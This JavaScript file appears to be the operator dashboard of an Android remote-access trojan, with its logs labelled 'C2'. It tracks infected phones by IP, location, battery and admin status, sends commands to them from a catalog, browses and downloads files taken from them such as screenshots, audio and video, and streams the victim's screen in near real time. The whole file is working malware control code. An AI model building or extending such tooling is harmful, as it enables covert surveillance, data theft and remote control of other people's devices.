/* Main dashboard controller — with on-screen error reporting. */

(() => {
  const state = {
    devices: [],
    current: null,
    catalog: {},
    socket: null,
    files: [],
    mirrorTimer: null,
  };

  const $ = sel => document.querySelector(sel);
  const $$ = sel => document.querySelectorAll(sel);

  // Global error banner
  function showError(msg) {
    let banner = document.getElementById("err-banner");
    if (!banner) {
      banner = document.createElement("div");
      banner.id = "err-banner";
      banner.style.cssText = "position:fixed;top:0;left:0;right:0;background:#ff3860;color:#fff;padding:10px;font-family:monospace;font-size:12px;z-index:99999";
      document.body.appendChild(banner);
    }
    banner.textContent = "ERROR: " + msg;
    console.error("[C2]", msg);
  }

  window.addEventListener("error", e => {
    showError(e.message + " @ " + (e.filename || "?") + ":" + (e.lineno || "?"));
  });
  window.addEventListener("unhandledrejection", e => {
    showError("promise: " + (e.reason && e.reason.message ? e.reason.message : String(e.reason)));
  });

  window.addEventListener("DOMContentLoaded", boot);

  async function boot() {
    try {
      console.log("[C2] boot: start");
      if (typeof GlobeViz === "undefined") { showError("GlobeViz missing"); return; }
      if (typeof Terminal === "undefined") { showError("Terminal missing"); return; }
      if (typeof C2 === "undefined") { showError("C2 panel missing"); return; }
      if (typeof io === "undefined") { showError("socket.io missing"); return; }

      console.log("[C2] boot: init globe");
      GlobeViz.init("globe");

      console.log("[C2] boot: mount terminal");
      Terminal.mount();

      console.log("[C2] boot: wire ui");
      wireUI();

      console.log("[C2] boot: load catalog");
      await loadCatalog();

      console.log("[C2] boot: refresh devices");
      await refreshDevices();

      console.log("[C2] boot: connect socket");
      connectSocket();

      tickClock();
      setInterval(tickClock, 1000);
      setInterval(refreshDevices, 15000);
      console.log("[C2] boot: done");
    } catch (e) {
      showError("boot: " + e.message);
    }
  }

  function tickClock() {
    const el = $("#globe-clock");
    if (el) el.textContent = new Date().toLocaleTimeString("en-GB");
  }

  function connectSocket() {
    const socket = io("/dashboard");
    state.socket = socket;
    socket.on("connect", () => {
      console.log("[C2] socket connected");
      socket.emit("subscribe_global");
    });
    socket.on("connect_error", (e) => {
      showError("socket: " + e.message);
    });
    socket.on("device_update", dev => {
      upsertDevice(dev);
      renderDeviceList();
      renderStats();
      GlobeViz.setDevices(state.devices);
    });
    socket.on("command_result", cmd => {
      if (state.current && cmd.device_id === state.current.id) Terminal.onResult(cmd);
    });
    socket.on("new_file", file => {
      C2.toast(`new file: ${file.filename}`, "info");
      if (state.current && file.device_id === state.current.id) {
        loadFiles(state.current.id);
        if (file.category === "screenshot") refreshMirrorOnce();
      }
    });
    socket.on("log", entry => {
      if (state.current && entry.device_id === state.current.id) appendLog(entry);
    });
  }

  async function loadCatalog() {
    state.catalog = await C2.apiJson("/api/catalog");
    renderCatalog();
  }

  async function refreshDevices() {
    try {
      const devices = await C2.apiJson("/api/devices");
      console.log("[C2] devices:", devices && devices.length);
      state.devices = Array.isArray(devices) ? devices : [];
      renderDeviceList();
      renderStats();
      GlobeViz.setDevices(state.devices);
    } catch (e) {
      showError("refreshDevices: " + e.message);
    }
  }

  function upsertDevice(dev) {
    const idx = state.devices.findIndex(d => d.id === dev.id);
    if (idx >= 0) state.devices[idx] = dev;
    else state.devices.unshift(dev);
  }

  function renderStats() {
    const online = state.devices.filter(d => d.is_online).length;
    $("#stat-online").textContent = online;
    $("#stat-total").textContent = state.devices.length;
    $("#stat-cmds").textContent = "0";
  }

  function renderDeviceList() {
    const ul = $("#device-list");
    if (!ul) { showError("device-list missing"); return; }
    const q = ($("#device-search") && $("#device-search").value || "").toLowerCase();
    ul.innerHTML = "";
    state.devices
      .filter(d => {
        if (!q) return true;
        return (d.model || "").toLowerCase().includes(q)
          || (d.ip_address || "").includes(q)
          || (d.hostname || "").toLowerCase().includes(q)
          || (d.device_id || "").toLowerCase().includes(q)
          || (d.tags || []).some(t => t.toLowerCase().includes(q));
      })
      .forEach(d => {
        const li = document.createElement("li");
        li.className = d.is_online ? "online" : "";
        li.dataset.id = d.id;
        const tags = (d.tags || []).map(t => `<span class="mini-tag">${C2.escapeHtml(t)}</span>`).join("");
        li.innerHTML = `
          <span class="dev-name">${C2.escapeHtml(d.model || "unknown")}</span>
          <span class="dev-meta">${C2.escapeHtml(d.ip_address || "-")} · ${d.battery}% · ${C2.escapeHtml(d.android_version || "")}</span>
          ${tags ? `<div class="mini-tags">${tags}</div>` : ""}
        `;
        li.addEventListener("click", () => openDevice(d));
        ul.appendChild(li);
      });
  }

  function renderCatalog() {
    const wrap = $("#command-catalog");
    wrap.innerHTML = "";
    Object.entries(state.catalog).forEach(([type, info]) => {
      const card = document.createElement("div");
      card.className = "cmd-card";
      card.innerHTML = `
        <div class="name">${type}</div>
        <div class="desc">${C2.escapeHtml(info.desc)}</div>
        <div class="args">${(info.args || []).map(a => `<span class="arg">${C2.escapeHtml(a)}</span>`).join("")}</div>
      `;
      card.addEventListener("click", () => promptCommand(type, info));
      wrap.appendChild(card);
    });
  }

  async function promptCommand(type, info) {
    if (!state.current) return;
    const args = {};
    for (const argDef of info.args || []) {
      const [name, typ] = argDef.split(":");
      const val = prompt(`القيمة للوسيط "${name}" (${typ || "string"})`, "");
      if (val === null) return;
      if (typ === "int") args[name] = parseInt(val, 10);
      else if (typ === "bool") args[name] = val.toLowerCase() === "true";
      else args[name] = val;
    }
    const cmd = await C2.apiJson(`/api/device/${state.current.id}/command`, {
      method: "POST",
      body: JSON.stringify({ type, args })
    });
    Terminal.write(`[task #${cmd.id}] ${type} queued`, "in");
    C2.toast(`command queued: ${type}`, "ok");
  }

  async function openDevice(dev) {
    state.current = dev;
    $("#device-panel").classList.remove("hidden");
    $("#welcome").classList.add("hidden");

    $("#dev-title").textContent = dev.model || dev.device_id;
    $("#dev-ip").textContent = dev.ip_address || "-";
    $("#dev-model").textContent = dev.manufacturer ? `${dev.manufacturer} ${dev.model}` : dev.model || "-";
    $("#dev-android").textContent = `Android ${dev.android_version || "?"} (SDK ${dev.sdk_int || "?"})`;
    $("#dev-battery").textContent = `${dev.battery}%${dev.is_charging ? " ⚡" : ""}`;
    $("#dev-admin").style.display = dev.is_admin ? "inline-block" : "none";
    renderTagRow(dev);

    Terminal.setDevice(dev.id);
    Terminal.write(`[session] attached to device #${dev.id}`, "in");

    if (dev.latitude && dev.longitude) GlobeViz.focusOn(dev.latitude, dev.longitude);
    state.socket.emit("subscribe", { device_id: dev.id });

    await loadFiles(dev.id);
    await loadLogs(dev.id);
    refreshMirrorOnce();
    $("#notes-area").value = dev.notes || "";
    $("#tag-input").value = (dev.tags || []).join(", ");
  }

  function renderTagRow(dev) {
    const row = $("#dev-tags");
    row.innerHTML = (dev.tags || []).map(t => `<span class="big-tag">${C2.escapeHtml(t)}</span>`).join("");
  }

  async function loadFiles(devId) {
    state.files = await C2.apiJson(`/api/device/${devId}/files`);
    renderFiles();
  }

  function renderFiles() {
    const grid = $("#file-grid");
    const filter = $("#file-filter").value;
    const files = filter ? state.files.filter(f => f.category === filter) : state.files;
    $("#file-count").textContent = `${files.length} files`;
    grid.innerHTML = "";
    files.forEach(f => {
      const card = document.createElement("div");
      card.className = "file-card";
      const isImg = (f.mime_type || "").startsWith("image/");
      const isVid = (f.mime_type || "").startsWith("video/");
      const isAud = (f.mime_type || "").startsWith("audio/");
      let preview;
      if (isImg) preview = `<img src="/api/file/${f.id}/raw" loading="lazy">`;
      else if (isVid) preview = `<video src="/api/file/${f.id}/raw" muted></video>`;
      else if (isAud) preview = `<span class="file-glyph">🎙</span>`;
      else preview = `<span class="file-glyph">📄</span>`;
      card.innerHTML = `
        <div class="preview">${preview}</div>
        <div class="info">
          <span class="fn">${C2.escapeHtml(f.filename)}</span>
          <span>${f.category} · ${C2.fmtBytes(f.size_bytes)}</span>
        </div>
        <div class="file-actions">
          <button class="btn-view">view</button>
          <button class="btn-dl">download</button>
        </div>
      `;
      card.addEventListener("click", (ev) => {
        if (ev.target.classList.contains("btn-dl")) window.open(`/api/file/${f.id}/download`, "_blank");
        else openFileViewer(f);
      });
      grid.appendChild(card);
    });
  }

  function openFileViewer(f) {
    const isImg = (f.mime_type || "").startsWith("image/");
    const isVid = (f.mime_type || "").startsWith("video/");
    let body;
    if (isImg) body = `<img class="viewer-media" src="/api/file/${f.id}/raw">`;
    else if (isVid) body = `<video class="viewer-media" controls src="/api/file/${f.id}/raw"></video>`;
    else body = `<div class="viewer-binary">preview unavailable</div>`;
    C2.openModal(`
      <div class="modal-head">
        <div><div class="modal-title">${C2.escapeHtml(f.filename)}</div>
        <div class="modal-sub">${f.category} · ${C2.fmtBytes(f.size_bytes)}</div></div>
        <button class="modal-close" onclick="C2.closeModal()">✕</button>
      </div>
      <div class="modal-body">${body}</div>
      <div class="modal-foot"><a href="/api/file/${f.id}/download" download>download</a></div>
    `);
  }

  async function loadLogs(devId) {
    const logs = await C2.apiJson(`/api/device/${devId}/logs`);
    const box = $("#log-stream");
    box.innerHTML = "";
    logs.slice().reverse().forEach(appendLog);
  }

  function appendLog(entry) {
    const box = $("#log-stream");
    const row = document.createElement("div");
    row.className = `log-row ${entry.level}`;
    row.innerHTML = `<span class="time">${new Date(entry.created_at).toLocaleTimeString()}</span><span class="level">${entry.level}</span><span class="msg">${C2.escapeHtml(entry.message)}</span>`;
    box.appendChild(row);
    box.scrollTop = box.scrollHeight;
  }

  function refreshMirrorOnce() {
    if (!state.current) return;
    const img = $("#mirror-img");
    img.src = `/api/device/${state.current.id}/latest-screenshot?ts=${Date.now()}`;
    img.onerror = () => { img.removeAttribute("src"); };
  }

  function toggleMirror() {
    const btn = $("#mirror-stream-toggle");
    if (state.mirrorTimer) {
      clearInterval(state.mirrorTimer); state.mirrorTimer = null;
      btn.textContent = "start live"; $("#mirror-fps").textContent = "idle";
      return;
    }
    btn.textContent = "stop live"; $("#mirror-fps").textContent = "polling 0.5 fps";
    state.mirrorTimer = setInterval(() => {
      if (state.current) {
        const img = $("#mirror-img");
        img.src = `/api/device/${state.current.id}/latest-screenshot?ts=${Date.now()}`;
      }
    }, 2000);
  }

  function wireUI() {
    $("#device-search").addEventListener("input", renderDeviceList);

    $("#dev-close").addEventListener("click", () => {
      if (state.current && state.socket) state.socket.emit("unsubscribe", { device_id: state.current.id });
      if (state.mirrorTimer) { clearInterval(state.mirrorTimer); state.mirrorTimer = null; }
      $("#device-panel").classList.add("hidden");
      $("#welcome").classList.remove("hidden");
      state.current = null;
    });

    $$(".tabs button").forEach(btn => {
      btn.addEventListener("click", () => {
        $$(".tabs button").forEach(b => b.classList.remove("active"));
        $$(".tab-panel").forEach(p => p.classList.remove("active"));
        btn.classList.add("active");
        document.querySelector(`[data-panel="${btn.dataset.tab}"]`).classList.add("active");
      });
    });

    $("#notes-save").addEventListener("click", async () => {
      if (!state.current) return;
      await C2.apiJson(`/api/device/${state.current.id}/notes`, {
        method: "POST",
        body: JSON.stringify({ notes: $("#notes-area").value })
      });
      C2.toast("notes saved", "ok");
    });

    $("#tags-save").addEventListener("click", async () => {
      if (!state.current) return;
      const tags = $("#tag-input").value.split(",").map(t => t.trim()).filter(Boolean);
      const dev = await C2.apiJson(`/api/device/${state.current.id}/tags`, {
        method: "POST", body: JSON.stringify({ tags })
      });
      state.current = dev;
      renderTagRow(dev);
      renderDeviceList();
      C2.toast("tags saved", "ok");
    });

    $("#file-filter").addEventListener("change", renderFiles);
    $("#mirror-refresh").addEventListener("click", refreshMirrorOnce);
    $("#mirror-stream-toggle").addEventListener("click", toggleMirror);
  }
})();
